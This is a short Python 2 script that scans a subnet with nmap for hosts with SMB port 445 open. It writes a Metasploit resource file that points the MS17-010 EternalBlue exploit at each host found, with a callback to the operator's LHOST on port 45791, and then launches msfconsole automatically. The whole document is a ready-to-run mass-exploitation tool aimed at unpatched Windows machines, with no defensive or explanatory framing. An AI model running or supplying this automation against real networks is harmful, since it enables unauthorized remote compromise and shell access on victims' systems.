import nmap;

def FindHosts(subNet):
	nmaper = nmap.PortScanner();
	nmaper.scan(subNet,'445');
	hosts=[];
	for host in nmaper.all_hosts():
		if( not nmaper[host].has_tcp(445) ):
			print '[-]IP error:'+host;
			break;
		state = nmaper[host]['tcp'][445]['state'];
		if state == 'open':
			hosts.append(host);
	return hosts;

"""def FindHost(subNet):
	nmapScanner = nmp.PortScanner();
	nmapScanner.scan(subNet,'445');
	targets=[];
	for host in nmapScanner.all_hosts():
		if nmapScanner[host].has_tcp(445):
			if nmapScanner[host]['tcp'][445]['state'] == 'open':
				targets.append(host);
	return targets;"""

def WriteScript(fp,rhost,lhost):
	ScriptModule = """use exploit/windows/smb/ms17_010_eternalblue
set RHOST %s
set LHOST %s
set LPORT 45791
set VerifyArch false
exploit"""%(rhost,lhost);
	fp.write(ScriptModule);
import optparse;
def Main():
	Parser = optparse.OptionParser("Usage: python Script.py -l <selfip> -r <targetip>");
	Parser.add_option('-l','--lhost',dest='lhost',type='string',help=' parameter need a self ip ');
	Parser.add_option('-r','--rhost',dest='rhost',type='string',help=' parameter need a target ip');
	(options,args)=Parser.parse_args();
	lhost=options.lhost ;
	rhost=options.rhost;
	if lhost==None or rhost == None:
		print '[?]You Need python Script.py -h';
		exit(0);
	fp = open('con.rc','w');
	hosts= FindHosts(rhost);
	for i in hosts:
		WriteScript(fp,i,lhost);
	import os;
	fp.close();
	os.system("msfconsole -r con.rc");
	None;



if __name__ == '__main__':
	Main();


